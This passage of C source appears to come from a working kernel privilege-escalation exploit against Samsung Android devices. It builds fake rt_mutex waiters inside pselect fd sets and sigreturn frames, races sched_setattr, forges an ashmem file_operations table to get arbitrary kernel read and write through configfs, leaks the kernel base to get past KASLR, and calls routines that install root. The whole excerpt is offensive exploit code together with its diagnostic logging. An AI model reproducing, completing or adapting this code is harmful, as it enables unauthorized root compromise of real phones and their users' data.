        sigreturn_return_tick <= sigreturn_handler_tick ||
        sigreturn_fault_madvise_ret != 0 ||
        sigreturn_fault_evict_ret != 0) {
      samples[i] = 0;
      ok = 0;
    } else {
      samples[i] = sigreturn_return_tick - sigreturn_handler_tick;
    }
  }
  for (size_t i = 1; i < sizeof(samples) / sizeof(samples[0]); i++) {
    uint64_t value = samples[i];
    size_t j = i;
    while (j && samples[j - 1] > value) {
      samples[j] = samples[j - 1];
      j--;
    }
    samples[j] = value;
  }
  uint64_t freq = read_cntfrq();
  pr_info("rt_sigreturn-fault backing=%s frame=%p fpsimd=%p parser=%p done=%p\n",
          sigreturn_fault_backing ? sigreturn_fault_backing : "unknown",
          (void *)sigreturn_fault_frame,
          (void *)sigreturn_fault_fpsimd_page,
          (void *)sigreturn_fault_parser_page,
          (void *)sigreturn_fault_done_page);
  pr_info("rt_sigreturn-fault madvise parser=%d/%d fpsimd=%d/%d evict_tick=%llu\n",
          (int)sigreturn_fault_madvise_ret,
          (int)sigreturn_fault_madvise_errno,
          (int)sigreturn_fault_evict_ret,
          (int)sigreturn_fault_evict_errno,
          (unsigned long long)sigreturn_fault_evict_tick);
  pr_info("rt_sigreturn-fault ticks min=%llu median=%llu max=%llu freq=%llu"
          " ns=%llu/%llu/%llu\n",
          (unsigned long long)samples[0],
          (unsigned long long)samples[4],
          (unsigned long long)samples[7],
          (unsigned long long)freq,
          (unsigned long long)(samples[0] * 1000000000ULL / freq),
          (unsigned long long)(samples[4] * 1000000000ULL / freq),
          (unsigned long long)(samples[7] * 1000000000ULL / freq));
  pr_info("rt_sigreturn-fault signal=%d error=%d\n",
          (int)sigreturn_handler_seen, (int)sigreturn_handler_error);
  cleanup_rt_sigreturn_fault_stack();
  if (ok) pr_success("rt_sigreturn-fault-check complete\n");
  return ok;
}

void sync_sigreturn_phase(void) {
  if (!page_base || !fake_lock || !fake_task || !fake_fops) {
    cfi_last_step = 33;
    cfi_last_errno = 0;
    return;
  }

  uint64_t *words = (uint64_t *)sigreturn_waiter_payload;
  memset(sigreturn_waiter_payload, 0, sizeof(sigreturn_waiter_payload));
  if (WAITER_LEGACY_4_19) {
    /* Supply a candidate 0x50-byte waiter payload.  Both RB nodes start as
     * childless red nodes.  If the expected live dequeue/insertion path is
     * reached, it should mutate fake_lock's controlled W0 root. */
    words[0] = 0;
    words[1] = 0;
    words[2] = 0;
    words[3] = 0;
    words[4] = 0;
    words[5] = 0;
    words[6] = fake_task;
    words[7] = fake_lock;
    words[8] = FAKE_WAITER_PRIO;
    words[9] = 0;
  } else {
    words[0] = fake_parent;
    words[1] = fake_right;
    words[2] = fake_left;
    words[3] = fake_task;
    words[4] = fake_lock;
    words[5] = FAKE_WAITER_PRIO;
    words[6] = 0;
  }

  if (!install_rt_sigreturn_handler()) {
    cfi_last_step = 34;
    cfi_last_errno = errno;
    return;
  }
  if (!fire_rt_sigreturn_payload()) {
    cfi_last_step = 35;
    cfi_last_errno = sigreturn_handler_error;
    return;
  }

  /* No syscall may run between rt_sigreturn and the PI consumer.  Publishing
   * entered after the kernel restore makes the consumer's single punch the
   * next kernel entry on this thread's abandoned syscall stack. */
  /* A non-zero sentinel is sufficient for the zero-delay backend and avoids
   * even a possible clock_gettime fallback syscall on the overwritten stack. */
  atomic_store(&gk_enter_ts, 1);
  atomic_store(&gk_pselect_entered, 1);
  while (!atomic_load(&gk_route_done))
    __asm__ volatile("yield" ::: "memory");
  atomic_store(&gk_pselect_entered, 0);

  int window_hit = atomic_load(&gk_fire_success) > 0;
  atomic_store(&gk_window_hit, window_hit);
  if (window_hit && !pselect_custom_write_enabled() &&
      !atomic_load_explicit(&route_carrier_diagnostic_only,
                            memory_order_acquire)) {
    if (try_cfi_stage()) cfi_last_step = 0;
    else if (!cfi_last_step) cfi_last_step = 36;
  }
}

void classic_sigreturn_phase(void) {
  if (!page_base || !fake_lock || !fake_task || !fake_fops) {
    cfi_last_step = 38;
    cfi_last_errno = 0;
    return;
  }

  uint64_t *words = (uint64_t *)sigreturn_waiter_payload;
  memset(sigreturn_waiter_payload, 0, sizeof(sigreturn_waiter_payload));
  if (WAITER_LEGACY_4_19) {
    /* Same candidate waiter shape as the synchronized carrier above. */
    words[0] = 0;
    words[1] = 0;
    words[2] = 0;
    words[3] = 0;
    words[4] = 0;
    words[5] = 0;
    words[6] = fake_task;
    words[7] = fake_lock;
    words[8] = FAKE_WAITER_PRIO;
    words[9] = 0;
  } else {
    words[0] = fake_parent;
    words[1] = fake_right;
    words[2] = fake_left;
    words[3] = fake_task;
    words[4] = fake_lock;
    words[5] = FAKE_WAITER_PRIO;
    words[6] = 0;
  }
  if (!prepare_rt_sigreturn_fault_stack()) {
    cfi_last_step = 39;
    cfi_last_errno = errno;
    return;
  }
  sigreturn_fault_mode = 1;
  atomic_store(&sigreturn_fault_armed, 0);
  atomic_store(&sigreturn_fault_evict_go, 0);
  atomic_store(&sigreturn_fault_tail_evicted, 0);
  sigreturn_fault_evict_ret = -1;
  if (!install_rt_sigreturn_handler()) {
    cfi_last_step = 39;
    cfi_last_errno = errno;
    cleanup_rt_sigreturn_fault_stack();
    return;
  }
  pthread_t evict_thread;
  if (pthread_create(&evict_thread, NULL,
                     rt_sigreturn_fault_evict_thread, NULL) != 0) {
    cfi_last_step = 39;
    cfi_last_errno = errno;
    cleanup_rt_sigreturn_fault_stack();
    return;
  }

  /* Arm the existing route consumer before the signal.  It waits for the
   * parser page to become resident, then enters sched_setattr during the
   * second (post-payload) FPSIMD-tail fault. */
  atomic_store(&gk_enter_ts, 0);
  atomic_store(&punch_consume_go, 1);
  int fired = fire_rt_sigreturn_payload();
  if (!fired) {
    cfi_last_step = 40;
    cfi_last_errno = sigreturn_handler_error;
  }
  pthread_join(evict_thread, NULL);
  /* The consumer normally clears this while rt_sigreturn is fault-held. */
  while (atomic_load(&punch_consume_go) != 0)
    __asm__ volatile("yield" ::: "memory");
  cleanup_rt_sigreturn_fault_stack();
  if (!fired) return;

  int window_hit = atomic_load(&consumer_success) > 0;
  atomic_store(&gk_window_hit, window_hit);
  if (window_hit && !pselect_custom_write_enabled() &&
      !atomic_load_explicit(&route_carrier_diagnostic_only,
                            memory_order_acquire)) {
    if (try_cfi_stage()) cfi_last_step = 0;
    else if (!cfi_last_step) cfi_last_step = 41;
  } else if (window_hit) {
    cfi_last_step = 0;
  }
}
#else
int install_rt_sigreturn_handler(void) { errno = ENOTSUP; return 0; }
int rt_sigreturn_route_selftest(void) { errno = ENOTSUP; return 0; }
int rt_sigreturn_fault_selftest(void) { errno = ENOTSUP; return 0; }
int rt_sigreturn_fault_consumer_window(void) { return 0; }
int rt_sigreturn_fault_inflight_state(void) { return 0; }
int rt_sigreturn_fault_wchan_state(void) { return 0; }
int rt_sigreturn_fault_tail_refault_state(void) { return 0; }
void sync_sigreturn_phase(void) { cfi_last_step = 37; cfi_last_errno = ENOTSUP; }
void classic_sigreturn_phase(void) { cfi_last_step = 42; cfi_last_errno = ENOTSUP; }
#endif

void fdset_put_word(fd_set *set, int word, uint64_t value) {
  unsigned long *bits = (unsigned long *)set;
  bits[word] = (unsigned long)value;
}

/* EDEADLK-synchronized pselect phase (Samsung 6.1): runs on the waiter
 * thread after the handshake.  pselect6 uses a 100ms timeout; the consumer
 * fires one precisely timed sched_setattr at enter_ts + delay. */
void sync_pselect_phase(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    cfi_last_step = 30;
    cfi_last_errno = 0;
    pr_error("sync route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  int pipefd[2];
  SYSCHK(pipe(pipefd));
  int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
  if (block_fd < 0) {
    pr_warning("sync route timerfd_create failed errno=%d; using pipe read end\n",
               errno);
    block_fd = pipefd[0];
  }
  int high_read = fcntl(block_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 16);
  if (high_read < 0) {
    cfi_last_step = 31;
    cfi_last_errno = errno;
    pr_error("sync route F_DUPFD read errno=%d\n", errno);
    if (block_fd != pipefd[0]) {
      close(block_fd);
    }
    close(pipefd[0]);
    close(pipefd[1]);
    return;
  }

  fd_set in;
  fd_set out;
  fd_set ex;
  prepare_pselect_fdsets(&in, &out, &ex);
  open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);
  pr_info("sync pselect fds ready high_read=%d block_fd=%d pipe_r=%d pipe_w=%d nfds=%d\n",
          high_read, block_fd, pipefd[0], pipefd[1], PSELECT_ROUTE_NFDS);

  struct timespec timeout = { .tv_sec = 0, .tv_nsec = 100000000L };
  atomic_store(&gk_pselect_entered, 1);
  atomic_store(&gk_enter_ts, mono_ns());
  errno = 0;
  int ret = (int)syscall(SYS_pselect6, PSELECT_ROUTE_NFDS, &in, &out, &ex,
                         &timeout, NULL);
  int saved_errno = errno;
  pr_info("sync pselect syscall returned ret=%d errno=%d\n", ret, saved_errno);
  pr_info("sync pselect post begin ret=%d route=%d fire=%d\n",
          ret, atomic_load(&gk_route_done), atomic_load(&gk_fire_success));
  atomic_store(&gk_pselect_entered, 0);
  pr_info("sync pselect post cleared entered route=%d fire=%d\n",
          atomic_load(&gk_route_done), atomic_load(&gk_fire_success));

  /* Give the owner a 200ms settle window; the consumer sets route_done
   * right after firing. */
  pr_info("sync pselect settle begin route=%d fire=%d\n",
          atomic_load(&gk_route_done), atomic_load(&gk_fire_success));
  uint64_t deadline = mono_ns() + 200000000ULL;
  while (!atomic_load(&gk_route_done) && mono_ns() < deadline) {
    usleep(1000);
  }
  pr_info("sync pselect settle done route=%d fire=%d\n",
          atomic_load(&gk_route_done), atomic_load(&gk_fire_success));
  int window_hit = (ret > 0) && atomic_load(&gk_fire_success) > 0;
  atomic_store(&gk_window_hit, window_hit);
  pr_info("sync route ret=%d errno=%d fire=%d hit=%d\n",
          ret, saved_errno, atomic_load(&gk_fire_success), window_hit);

  if (window_hit && !pselect_custom_write_enabled() &&
      !atomic_load_explicit(&route_carrier_diagnostic_only,
                            memory_order_acquire)) {
    if (try_cfi_stage()) {
      cfi_last_step = 0;
    } else if (!cfi_last_step) {
      cfi_last_step = 32;
    }
  }

  close(high_read);
  if (block_fd != pipefd[0]) {
    close(block_fd);
  }
  close(pipefd[0]);
  close(pipefd[1]);
}



uint64_t fdset_get_word(const fd_set *set, int word) {
  const unsigned long *bits = (const unsigned long *)set;
  return bits[word];
}

static int pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (PSELECT_ROUTE_NFDS + bits_per_word - 1) / bits_per_word;
}

static int pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

static int pselect_waiter_shift(void) {
  return active_offsets ? active_offsets->pselect_waiter_shift
                        : PSELECT_WAITER_WORD_SHIFT;
}

static void pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, uint64_t value, const char *name) {
  int global_word = pselect_waiter_shift() + waiter_word;
  int placed = pselect_put_global_word(
      in, out, ex, words_per_set, global_word, value);
  if (!placed) {
    pr_warning("pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               PSELECT_ROUTE_NFDS);
  }
}

void open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
  (void)write_fd;

  int high_read = fcntl(read_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
  if (high_read < 0) {
    pr_warning("pselect F_DUPFD read errno=%d\n", errno);
    return;
  }
  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(high_read, fd);
    }
  }
  close(high_read);
  dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
  FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
}

void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  int words_per_set = pselect_words_per_set();
  struct pselect_waiter_word {
    int word;
    uint64_t value;
    const char *name;
  };
  uint64_t waiter_task =
    pselect_custom_write_enabled() ? fake_task : text_addr(INIT_TASK);
  if (WAITER_LEGACY_4_19) {
    /* Stock Samsung 4.19 rt_mutex_waiter (0x50).  Word index includes
     * the two-word pselect embedding prefix.  There is no wake_state or
     * ww_ctx, and prio occupies the low 32 bits at byte offset 0x40. */
    struct pselect_waiter_word words[] = {
      {2, 0, "tree_pc"},
      {3, 0, "tree_right"},
      {4, 0, "tree_left"},
      {5, 0, "pi_parent"},
      {6, 0, "pi_right"},
      {7, 0, "pi_left"},
      {8, waiter_task, "task"},
      {9, fake_lock, "lock"},
      {10, FAKE_WAITER_PRIO, "prio"},
      {11, 0, "deadline"},
    };
    for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
      struct pselect_waiter_word *w = &words[i];
      pselect_put_waiter_word(
          in, out, ex, words_per_set, w->word, w->value, w->name);
    }
    return;
  }
  if (WAITER_COMPACT) {
    /* 6.1 compact rt_mutex_waiter (0x58): tree_entry 0x00, pi_tree_entry
     * 0x18, task 0x30, lock 0x38, wake_state+prio 0x40, deadline 0x48,
     * ww_ctx 0x50.  Word index = byte offset / 8 + 2. */
    struct pselect_waiter_word words[] = {
      {2, 0, "tree_pc"},
      {3, 0, "tree_right"},
      {4, 0, "tree_left"},
      {5, 0, "pi_parent"},
      {6, 0, "pi_right"},
      {7, 0, "pi_left"},
      {8, waiter_task, "task"},
      {9, fake_lock, "lock"},
      {10, 3ULL | (1ULL << 32), "wake_state+prio"},
      {11, 0, "deadline"},
      {12, 0, "ww_ctx"},
    };
    for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
      struct pselect_waiter_word *w = &words[i];
      pselect_put_waiter_word(
          in, out, ex, words_per_set, w->word, w->value, w->name);
    }
    return;
  }
  struct pselect_waiter_word words[] = {
    {2, 0, "tree_pc"},
    {3, 0, "tree_right"},
    {4, 0, "tree_left"},
    {5, 1, "tree_prio"},
    {6, 0, "tree_deadline"},
    {7, 0, "pi_parent"},
    {8, 0, "pi_right"},
    {9, 0, "pi_left"},
    {10, 1, "pi_prio"},
    {11, 0, "pi_deadline"},
    {12, waiter_task,
     "task"},
    {13, fake_lock, "lock"},
    {14, 3, "wake_state"},
  };
  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
    struct pselect_waiter_word *w = &words[i];
    pselect_put_waiter_word(
        in, out, ex, words_per_set, w->word, w->value, w->name);
  }
}

void do_pselect_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    cfi_last_step = 30;
    cfi_last_errno = 0;
    pr_error("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  struct timespec route_t0;
  clock_gettime(CLOCK_MONOTONIC, &route_t0);
  int calls = 0;
  int success = 0;
  int route_verified = 0;
  for (int route_attempt = 1; route_attempt <= PSELECT_CFI_ROUTE_ATTEMPTS;
       route_attempt++) {
    if (route_attempt != 1) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (!page_base || !fake_lock || !fake_fops) {
        cfi_last_step = 34;
        cfi_last_errno = errno;
        pr_error("pselect retry page prepare failed attempt=%d base=%016zx "
                 "lock=%016zx fops=%016zx\n",
                 route_attempt, page_base, fake_lock, fake_fops);
        break;
      }
    }

    int pipefd[2];
    SYSCHK(pipe(pipefd));
    int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
    if (block_fd < 0) {
      pr_warning("pselect timerfd_create failed errno=%d; using pipe read end\n",
                 errno);
      block_fd = pipefd[0];
    }
    int high_read = fcntl(block_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 16);
    if (high_read < 0) {
      cfi_last_step = 31;
      cfi_last_errno = errno;
      pr_error("pselect F_DUPFD read errno=%d\n", errno);
      if (block_fd != pipefd[0]) {
        close(block_fd);
      }
      close(pipefd[0]);
      close(pipefd[1]);
      break;
    }

    fd_set in;
    fd_set out;
    fd_set ex;
    prepare_pselect_fdsets(&in, &out, &ex);
    pr_info("pselect route setup attempt=%d simple=%d shift=%d page=%016zx "
            "fake_lock=%016zx fake_w0=%016zx fake_task=%016zx "
            "in0=%016llx in3=%016llx out0=%016llx ex0=%016llx "
            "ex1=%016llx ex2=%016llx ex3=%016llx\n",
            route_attempt,
            0, pselect_waiter_shift(),
            page_base, fake_lock, fake_w0, fake_task,
            (unsigned long long)fdset_get_word(&in, 0),
            (unsigned long long)fdset_get_word(&in, 3),
            (unsigned long long)fdset_get_word(&out, 0),
            (unsigned long long)fdset_get_word(&ex, 0),
            (unsigned long long)fdset_get_word(&ex, 1),
            (unsigned long long)fdset_get_word(&ex, 2),
            (unsigned long long)fdset_get_word(&ex, 3));
    open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    int delay_usec = route_delay_usec(route_attempt);
    atomic_store(&main_route_delay_usec, delay_usec);
    atomic_store(&gk_enter_ts, 0);
    atomic_store(&punch_consume_go, route_attempt);

    struct timeval timeout = {
      .tv_sec = PSELECT_TIMEOUT_SEC,
#ifdef PSELECT_TIMEOUT_USEC
      .tv_usec = PSELECT_TIMEOUT_USEC,
#else
      .tv_usec = 0,
#endif
    };

    pr_info("pselect pre-select +%.0fms\n", fops_elapsed_ms(&route_t0));
    errno = 0;
    atomic_store(&gk_enter_ts, mono_ns());
    int ret = select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout);
    int saved_errno = errno;
    pr_info("pselect post-select +%.0fms ret=%d\n", fops_elapsed_ms(&route_t0), ret);
    atomic_store(&punch_consume_go, 0);

    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    pr_info("pselect returned attempt=%d ret=%d errno=%d calls=%d success=%d delay=%d\n",
            route_attempt, ret, saved_errno, calls, success, delay_usec);

    int route_quality_miss = 0;
    int route_signal = calls > 0 && success > 0;
    int cfi_probed = 0;
    if (route_signal) {
      cfi_probed = 1;
      if (ret != PSELECT_EXPECTED_READY) {
        pr_info("pselect route probing cfi attempt=%d ret=%d expected=%d\n",
                route_attempt, ret, PSELECT_EXPECTED_READY);
      }
      if (pselect_custom_write_enabled()) {
        cfi_last_step = 0;
        cfi_last_errno = 0;
        route_verified = 1;
      } else if (try_cfi_stage()) {
        cfi_last_step = 0;
        route_verified = 1;
      } else if (!cfi_last_step) {
        cfi_last_step = 32;
      }
    }
    if (!route_verified && route_signal) {
      route_quality_miss = 1;
      if (!cfi_probed) {
        cfi_last_step = 35;
        cfi_last_errno = saved_errno;
      }
      pr_info("pselect route quality miss attempt=%d/%d ret=%d expected=%d delay=%d; refreshing FOPS page\n",
              route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, ret,
              PSELECT_EXPECTED_READY, delay_usec);
    } else if (!route_verified) {
      cfi_last_step = 33;
      cfi_last_errno = saved_errno;
    }

    close(high_read);
    if (block_fd != pipefd[0]) {
      close(block_fd);
    }
    close(pipefd[0]);
    close(pipefd[1]);

    if (route_quality_miss) {
      continue;
    }
    if (route_verified || cfi_dirty_seen || cfi_last_step != 1) {
      break;
    }
    pr_info("pselect cfi write miss attempt=%d/%d errno=%d; refreshing FOPS page\n",
            route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, cfi_last_errno);
  }
  pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
          calls, success, cfi_last_step, cfi_last_errno);
}

int repair_fake_fops_llseek(int fd) {
  uint64_t llseek = text_addr(NOOP_LLSEEK);
  uint64_t after = 0;
  uintptr_t slot = fake_fops + FOPS_LLSEEK_OFF;
  ssize_t wr = configfs_write_once(fd, slot, &llseek, sizeof(llseek));
  ssize_t rd = configfs_read_once(fd, slot, &after, sizeof(after));
  return wr == (ssize_t)sizeof(llseek) &&
         rd == (ssize_t)sizeof(after) &&
         after == llseek;
}

int refresh_fake_fops_text(int fd) {
  struct fops_slot {
    size_t off;
    uint64_t value;
  } slots[] = {
    {FOPS_CONFIGFS_READ_OFF, text_addr(CONFIGFS_READ_FN)},
    {FOPS_CONFIGFS_WRITE_OFF, text_addr(CONFIGFS_WRITE_FN)},
    {FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL)},
    {FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL)},
    {FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP)},
    {FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN)},
    {FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE)},
    {FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ)},
    {FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO)},
  };

  for (size_t i = 0; i < sizeof(slots) / sizeof(slots[0]); i++) {
    uintptr_t target = fake_fops + slots[i].off;
    if (!is_direct_ptr(target) || !is_kernel_ptr(slots[i].value)) {
      pr_error("cfi fops refresh invalid slot=%zu off=%zx target=%016zx "
               "value=%016llx\n",
               i, slots[i].off, target,
               (unsigned long long)slots[i].value);
      return 0;
    }
    pr_info("cfi fops refresh begin slot=%zu off=%zx target=%016zx "
            "value=%016llx len=%zu\n",
            i, slots[i].off, target, (unsigned long long)slots[i].value,
            sizeof(slots[i].value));

    /* The sprayed table already contains the slide-adjusted open pointer.
     * This fd is open before misc_fops is redirected to fake_fops, and the
     * UMH path never opens it again.  Rewriting this field is unnecessary and
     * is the only refresh write that has rebooted the phone (shell21). */
    if (slots[i].off == FOPS_OPEN_OFF) {
      uint64_t existing = 0;
      errno = 0;
      ssize_t rd = kernel_read_data(fd, target, &existing, sizeof(existing));
      int read_errno = errno;
      pr_info("cfi fops open preflight target=%016zx ret=%zd value=%016llx "
              "want=%016llx errno=%d\n",
              target, rd, (unsigned long long)existing,
              (unsigned long long)slots[i].value, read_errno);
      if (rd == (ssize_t)sizeof(existing) && existing == slots[i].value) {
        pr_info("cfi fops refresh skip slot=%zu off=%zx reason=open-preloaded\n",
                i, slots[i].off);
        continue;
      }
      pr_warning("cfi fops open preflight mismatch; attempting refresh write\n");
    }

    errno = 0;
    ssize_t wr = kernel_write_data(
        fd, target, &slots[i].value, sizeof(slots[i].value));
    int write_errno = errno;
    pr_info("cfi fops refresh end slot=%zu off=%zx target=%016zx ret=%zd "
            "errno=%d\n",
            i, slots[i].off, target, wr, write_errno);
    if (wr != (ssize_t)sizeof(slots[i].value)) {
      return 0;
    }
  }
  return 1;
}

int leak_kernel_base(int fd) {
  kaslr_fops_alias = p0_data_alias(ASHMEM_FOPS);
  pr_info("cfi leak start fops_alias=%016zx open_off=%zx ioctl_off=%zx "
          "mmap_off=%zx release_off=%zx show_fdinfo_off=%zx\n",
          kaslr_fops_alias, (size_t)FOPS_OPEN_OFF, (size_t)FOPS_IOCTL_OFF,
          (size_t)FOPS_MMAP_OFF, (size_t)FOPS_RELEASE_OFF,
          (size_t)FOPS_SHOW_FDINFO_OFF);
  kaslr_open_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_OPEN_OFF);
  pr_info("cfi leak read open=%016llx\n",
          (unsigned long long)kaslr_open_ptr);
  kaslr_ioctl_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_IOCTL_OFF);
  pr_info("cfi leak read ioctl=%016llx\n",
          (unsigned long long)kaslr_ioctl_ptr);
  kaslr_mmap_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_MMAP_OFF);
  pr_info("cfi leak read mmap=%016llx\n",
          (unsigned long long)kaslr_mmap_ptr);
  kaslr_release_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_RELEASE_OFF);
  pr_info("cfi leak read release=%016llx\n",
          (unsigned long long)kaslr_release_ptr);
  kaslr_show_fdinfo_ptr =
    kernel_read64(fd, kaslr_fops_alias + FOPS_SHOW_FDINFO_OFF);
  pr_info("cfi leak read show_fdinfo=%016llx\n",
          (unsigned long long)kaslr_show_fdinfo_ptr);

  if (!is_kernel_ptr(kaslr_open_ptr) || !is_kernel_ptr(kaslr_ioctl_ptr) ||
      !is_kernel_ptr(kaslr_mmap_ptr) || !is_kernel_ptr(kaslr_release_ptr) ||
      !is_kernel_ptr(kaslr_show_fdinfo_ptr)) {
    kaslr_step = 1;
    return 0;
  }

  kaslr_base = kaslr_open_ptr - (ASHMEM_OPEN - KIMAGE_TEXT_BASE);
  kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  kaslr_expected_ioctl = text_addr(ASHMEM_IOCTL);
  kaslr_expected_mmap = text_addr(ASHMEM_MMAP);
  kaslr_expected_release = text_addr(ASHMEM_RELEASE);
  kaslr_expected_show_fdinfo = text_addr(ASHMEM_SHOW_FDINFO);
  pr_info("cfi leak base=%016llx expected ioctl=%016llx mmap=%016llx "
          "release=%016llx show_fdinfo=%016llx\n",
          (unsigned long long)kaslr_base,
          (unsigned long long)kaslr_expected_ioctl,
          (unsigned long long)kaslr_expected_mmap,
          (unsigned long long)kaslr_expected_release,
          (unsigned long long)kaslr_expected_show_fdinfo);

  if (kaslr_ioctl_ptr != kaslr_expected_ioctl ||
      kaslr_mmap_ptr != kaslr_expected_mmap ||
      kaslr_release_ptr != kaslr_expected_release ||
      kaslr_show_fdinfo_ptr != kaslr_expected_show_fdinfo) {
    kaslr_done = 0;
    kaslr_step = 2;
    return 0;
  }

  pr_info("cfi leak pointers verified; refreshing fake fops\n");
  if (!refresh_fake_fops_text(fd)) {
    kaslr_done = 0;
    kaslr_step = 3;
    return 0;
  }

  pr_info("cfi fake fops refresh complete\n");
  kaslr_step = 0;
  return 1;
}

int restore_slide_boot_id(int fd) {
  uintptr_t boot_id_data = SLIDE_RANDOM_BOOT_ID_DATA;
  slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
  configfs_read_once(
      fd, boot_id_data, &slide_bootid_before, sizeof(slide_bootid_before));
  slide_bootid_restore_ret =
    configfs_write_once(
        fd, boot_id_data, &slide_bootid_want, sizeof(slide_bootid_want));
  configfs_read_once(
      fd, boot_id_data, &slide_bootid_after, sizeof(slide_bootid_after));
  pr_info("slide restore boot_id data pid=%d ret=%zd before=%016llx "
          "want=%016llx after=%016llx errno=%d\n",
          getpid(), slide_bootid_restore_ret,
          (unsigned long long)slide_bootid_before,
          (unsigned long long)slide_bootid_want,
          (unsigned long long)slide_bootid_after, errno);
  return slide_bootid_restore_ret == (ssize_t)sizeof(slide_bootid_want) &&
         slide_bootid_after == slide_bootid_want;
}

int install_child_root(int fd) {
  /* Use the pipe-backed direct-map R/W path before walking slab-resident
   * workqueue objects.  Configfs remains the bootstrap channel used by
   * install_pipe_physrw itself. */
  if (active_offsets && active_offsets->umh_root) {
    return install_pipe_physrw(fd) && install_android_root(fd);
  }
  return install_pipe_physrw(fd) && install_android_root(fd);
}

int try_cfi_stage(void) {
  cfi_attempts++;
  int fd = open_ashmem_device();
  int dirty = 0;
  int can_read_back = 0;

  if (fd < 0) {
    cfi_last_step = 11;
    cfi_last_errno = errno;
    pr_info("cfi open failed path=%s errno=%d\n", ashmem_path, errno);
    return 0;
  }

  pr_info("cfi attempt=%d fd=%d path=%s fake_fops=%016zx target=%016zx "
          "ioctl=%016llx open=%016llx configfs_write=%016llx legacy_rw=%d\n",
          cfi_attempts, fd, ashmem_path, fake_fops, binwrite_target,
          (unsigned long long)text_addr(ASHMEM_IOCTL),
          (unsigned long long)text_addr(ASHMEM_OPEN),
          (unsigned long long)text_addr(CONFIGFS_WRITE_FN),
          CONFIGFS_LEGACY_RW);

  uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
  /* Do not call pwrite until this fd is demonstrably using the forged
   * configfs-compatible table.  With the stock ashmem fops, pwrite returns
   * EINVAL; on an Exynos profile a blind retry would only obscure whether
   * the required miscdevice handoff happened.  This read changes the private
   * ashmem name buffer but performs no kernel-memory write. */
  uint64_t pre_fops = 0;
  errno = 0;
  ssize_t pre_rb = configfs_read_once(
      fd, misc_fops, &pre_fops, sizeof(pre_fops));
  int pre_errno = errno;
  fops_before = pre_fops;
  pr_info("cfi fops preflight ret=%zd value=%016llx want=%016zx errno=%d\n",
          pre_rb, (unsigned long long)pre_fops, fake_fops, pre_errno);
  if (pre_rb != (ssize_t)sizeof(pre_fops) || pre_fops != fake_fops) {
    cfi_last_step = 4;
    cfi_last_errno = pre_errno;
    goto fail;
  }

  char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
  ssize_t n =
    configfs_write_once(fd, binwrite_target, payload, sizeof(payload));
  cfi_write_ret = n;
  pr_info("cfi write ret=%zd errno=%d\n", n, errno);
  if (n != (ssize_t)sizeof(payload)) {
    cfi_last_step = 1;
    cfi_last_errno = errno;
    goto fail;
  }
  dirty = 1;
  cfi_dirty_seen = 1;

  if (!repair_fake_fops_llseek(fd)) {
    cfi_last_step = 2;
    cfi_last_errno = errno;
    goto fail;
  }
  cfi_read_slot_ret = sizeof(uint64_t);
  can_read_back = 1;

  char readback[sizeof(payload)];
  memset(readback, 0, sizeof(readback));
  ssize_t r =
